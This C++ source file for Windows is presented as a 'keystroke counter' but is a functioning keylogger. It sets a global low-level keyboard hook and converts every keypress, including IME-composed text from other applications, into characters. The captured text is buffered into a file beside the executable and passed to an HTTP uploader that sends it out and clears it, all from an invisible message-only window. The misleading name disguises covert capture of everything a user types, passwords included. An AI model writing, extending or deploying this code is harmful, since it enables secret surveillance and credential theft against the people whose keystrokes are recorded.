#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#include <windows.h>
#include <imm.h>
#include "keystroke_counter.h"
#include "http_upload.h"

// Freestanding CRT shims (unchanged)
extern "C" void* memset(void* destination, int value, size_t count) {
    volatile unsigned char* bytes = static_cast<volatile unsigned char*>(destination);
    while (count--) *bytes++ = static_cast<unsigned char>(value);
    return destination;
}

extern "C" void* memcpy(void* destination, const void* source, size_t count) {
    volatile unsigned char* to = static_cast<volatile unsigned char*>(destination);
    const volatile unsigned char* from = static_cast<const volatile unsigned char*>(source);
    while (count--) *to++ = *from++;
    return destination;
}

namespace {
constexpr wchar_t kWindowClass[] = L"PDF.KeystrokeCount.MessageOnly";
constexpr UINT_PTR kSaveTimer = 1;
constexpr UINT kSaveDelayMs = 5000;

struct Counter {
    wchar_t* path;
    wchar_t* textBuffer;
    size_t textBufferSize;
    size_t textBufferUsed;
    bool pending;
    bool timerArmed;
    SRWLOCK fileLock;
    HKL layout;           // current foreground layout
    bool deadKeyPending;  // dead-key marker
};
Counter counter;

void ArmTimerIfNeeded(); // forward declaration

// Resolve beside the executable
wchar_t* ResolveCountPath() {
    constexpr wchar_t filename[] = L"yourtext.txt";
    constexpr DWORD maximum = 32768;
    for (DWORD capacity = MAX_PATH;; capacity = capacity > maximum / 2 ? maximum : capacity * 2) {
        wchar_t* path = static_cast<wchar_t*>(HeapAlloc(GetProcessHeap(), 0,
                                                       capacity * sizeof(wchar_t)));
        if (!path) return nullptr;
        const DWORD length = GetModuleFileNameW(nullptr, path, capacity);
        if (length && length < capacity) {
            DWORD start = length;
            while (start && path[start - 1] != L'\\' && path[start - 1] != L'/') --start;
            if (!start) { HeapFree(GetProcessHeap(), 0, path); return nullptr; }
            const DWORD required = start + sizeof(filename) / sizeof(wchar_t);
            if (required > capacity) {
                wchar_t* resized = static_cast<wchar_t*>(HeapReAlloc(GetProcessHeap(), 0,
                    path, required * sizeof(wchar_t)));
                if (!resized) { HeapFree(GetProcessHeap(), 0, path); return nullptr; }
                path = resized;
            }
            lstrcpyW(path + start, filename);
            return path;
        }
        HeapFree(GetProcessHeap(), 0, path);
        if (!length || capacity == maximum) return nullptr;
    }
}

bool InitializeFile() {
    counter.path = ResolveCountPath();
    if (!counter.path) return false;
    HANDLE file = CreateFileW(counter.path, GENERIC_READ | FILE_APPEND_DATA,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        nullptr, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (file != INVALID_HANDLE_VALUE) CloseHandle(file);

    counter.textBuffer = static_cast<wchar_t*>(HeapAlloc(GetProcessHeap(), 0, 4096 * sizeof(wchar_t)));
    if (!counter.textBuffer) return false;
    counter.textBufferSize = 4096;
    counter.textBufferUsed = 0;
    counter.layout = GetKeyboardLayout(0);
    counter.deadKeyPending = false;
    return true;
}

bool EnsureBufferCapacity(size_t needed) {
    if (counter.textBufferUsed + needed <= counter.textBufferSize) return true;
    size_t newSize = counter.textBufferSize ? counter.textBufferSize : 4096;
    while (newSize < counter.textBufferUsed + needed) newSize *= 2;
    wchar_t* resized = static_cast<wchar_t*>(HeapReAlloc(GetProcessHeap(), 0,
        counter.textBuffer, newSize * sizeof(wchar_t)));
    if (!resized) return false;
    counter.textBuffer = resized;
    counter.textBufferSize = newSize;
    return true;
}

void AppendText(const wchar_t* text, size_t length) {
    if (!length) return;
    AcquireSRWLockExclusive(&counter.fileLock);
    if (!EnsureBufferCapacity(length)) {
        ReleaseSRWLockExclusive(&counter.fileLock);
        return;
    }
    RtlCopyMemory(counter.textBuffer + counter.textBufferUsed, text,
                  length * sizeof(wchar_t));
    counter.textBufferUsed += length;
    counter.pending = true;
    ReleaseSRWLockExclusive(&counter.fileLock);
    ArmTimerIfNeeded();
}

bool SaveTotal() {
    if (!counter.pending || !counter.path) return true;

    AcquireSRWLockExclusive(&counter.fileLock);
    wchar_t* textToSave = counter.textBuffer;
    size_t textToSaveLength = counter.textBufferUsed;
    counter.textBufferUsed = 0;
    counter.pending = false;
    ReleaseSRWLockExclusive(&counter.fileLock);

    if (textToSaveLength == 0) return true;

    HANDLE file = CreateFileW(counter.path, FILE_APPEND_DATA,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        nullptr, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (file == INVALID_HANDLE_VALUE) return false;

    int size_needed = WideCharToMultiByte(CP_UTF8, 0, textToSave,
        (int)textToSaveLength, NULL, 0, NULL, NULL);
    bool success = false;
    DWORD written = 0;
    if (size_needed > 0) {
        char* utf8_text = static_cast<char*>(HeapAlloc(GetProcessHeap(), 0, (size_t)size_needed));
        if (utf8_text) {
            const int converted = WideCharToMultiByte(CP_UTF8, 0, textToSave,
                (int)textToSaveLength, utf8_text, size_needed, NULL, NULL);
            if (converted == size_needed) {
                success = WriteFile(file, utf8_text, (DWORD)size_needed, &written, nullptr) != FALSE
                          && written == (DWORD)size_needed;
            }
            HeapFree(GetProcessHeap(), 0, utf8_text);
        }
    }
    CloseHandle(file);
    return success;
}

// IME: read committed composition string from foreground window's IME context
void DrainImeComposition() {
    HWND foreground = GetForegroundWindow();
    if (!foreground) return;
    HIMC imc = ImmGetContext(foreground);
    if (!imc) return;

    DWORD size = ImmGetCompositionStringW(imc, GCS_RESULTSTR, nullptr, 0);
    if (size > 0 && size != (DWORD)-1) {
        wchar_t stackBuf[256];
        wchar_t* buf = (size / sizeof(wchar_t) <= 256)
            ? stackBuf
            : static_cast<wchar_t*>(HeapAlloc(GetProcessHeap(), 0, size));
        if (buf) {
            LONG got = ImmGetCompositionStringW(imc, GCS_RESULTSTR, buf, size);
            if (got > 0) AppendText(buf, (size_t)got / sizeof(wchar_t));
            if (buf != stackBuf) HeapFree(GetProcessHeap(), 0, buf);
        }
    }
    ImmReleaseContext(foreground, imc);
}

// Low-level keyboard hook
HHOOK g_hook = nullptr;
HWND g_window = nullptr;

bool HookShouldCapture(DWORD vk) {
    switch (vk) {
        case VK_SHIFT: case VK_LSHIFT: case VK_RSHIFT:
        case VK_CONTROL: case VK_LCONTROL: case VK_RCONTROL:
        case VK_MENU: case VK_LMENU: case VK_RMENU:
        case VK_CAPITAL: case VK_NUMLOCK: case VK_SCROLL:
        case VK_LWIN: case VK_RWIN:
        case VK_PROCESSKEY: // IME key, handled via DrainImeComposition
            return false;
    }
    return true;
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        const KBDLLHOOKSTRUCT* kb = reinterpret_cast<const KBDLLHOOKSTRUCT*>(lParam);
        if (kb && !(kb->flags & LLKHF_INJECTED) && HookShouldCapture(kb->vkCode)) {
            // Resolve foreground layout
            HKL layout = counter.layout;
            HWND fg = GetForegroundWindow();
            if (fg) {
                DWORD tid = GetWindowThreadProcessId(fg, nullptr);
                if (tid) layout = GetKeyboardLayout(tid);
            }
            counter.layout = layout;

            // Flush any IME-committed text first
            DrainImeComposition();

            BYTE ks[256];
            GetKeyboardState(ks);
            wchar_t chars[8];
            int r = ToUnicodeEx(kb->vkCode, kb->scanCode, ks, chars, 8, 0, layout);

            if (r > 0) {
                AppendText(chars, (size_t)r);
                counter.deadKeyPending = false;
            } else if (r == -1) {
                // Dead key: stored internally by Windows, next key composes
                counter.deadKeyPending = true;
            }
            // r == 0: control / IME in progress — ignore
        } else if (kb && !(kb->flags & LLKHF_INJECTED) && wParam == WM_KEYDOWN) {
            // Enter/Space may commit IME text
            DrainImeComposition();
        }
    }
    return CallNextHookEx(g_hook, nCode, wParam, lParam);
}

bool CheckpointBeforeClear(void* context) {
    (void)context;
    return SaveTotal();
}

LRESULT CALLBACK CounterWindow(HWND window, UINT message, WPARAM wParam, LPARAM lParam) {
    if (message == WM_TIMER && wParam == kSaveTimer) {
        KillTimer(window, kSaveTimer);
        counter.timerArmed = false;
        SaveTotal();
        return 0;
    }
    return DefWindowProcW(window, message, wParam, lParam);
}

void ArmTimerIfNeeded() {
    if (!counter.timerArmed && g_window) {
        counter.timerArmed = SetTimer(g_window, kSaveTimer, kSaveDelayMs, nullptr) != 0;
        if (!counter.timerArmed) SaveTotal();
    }
}
} // namespace

DWORD RunKeystrokeCounter(HANDLE stopEvent) {
    const HINSTANCE instance = GetModuleHandleW(nullptr);
    WNDCLASSW windowClass = {};
    windowClass.lpfnWndProc = CounterWindow;
    windowClass.hInstance = instance;
    windowClass.lpszClassName = kWindowClass;
    if (!RegisterClassW(&windowClass)) return 1;

    HWND window = CreateWindowExW(0, kWindowClass, L"", 0, 0, 0, 0, 0,
                                 HWND_MESSAGE, nullptr, instance, nullptr);
    if (!window) {
        UnregisterClassW(kWindowClass, instance);
        return 1;
    }
    g_window = window;

    if (!InitializeFile()) {
        DestroyWindow(window);
        UnregisterClassW(kWindowClass, instance);
        return 1;
    }

    // Low-level hook — no Raw Input registration needed
    g_hook = SetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc, nullptr, 0);

    CountUploadSource uploadSource = {counter.path, &counter.fileLock, stopEvent,
                                     CheckpointBeforeClear, &counter};
    HANDLE uploader = nullptr;
    DWORD result = 0;

    if (!g_hook) {
        result = 1;
    } else {
        uploader = StartCountUploader(&uploadSource);
        for (;;) {
            const DWORD wait = MsgWaitForMultipleObjectsEx(1, &stopEvent, INFINITE,
                                                          QS_ALLINPUT, MWMO_INPUTAVAILABLE);
            if (wait == WAIT_OBJECT_0) break;
            if (wait == WAIT_FAILED) { result = 1; break; }
            MSG message;
            for (unsigned batch = 0; batch < 256 &&
                 PeekMessageW(&message, nullptr, 0, 0, PM_REMOVE); ++batch) {
                DispatchMessageW(&message);
            }
        }
    }

    if (g_hook) { UnhookWindowsHookEx(g_hook); g_hook = nullptr; }
    SetEvent(stopEvent);
    if (counter.timerArmed) KillTimer(window, kSaveTimer);
    SaveTotal();

    if (uploader) {
        WaitForSingleObject(uploader, INFINITE);
        CloseHandle(uploader);
    }

    if (counter.path) HeapFree(GetProcessHeap(), 0, counter.path);
    if (counter.textBuffer) HeapFree(GetProcessHeap(), 0, counter.textBuffer);
    counter.path = nullptr;
    counter.textBuffer = nullptr;
    DestroyWindow(window);
    UnregisterClassW(kWindowClass, instance);
    return result;
}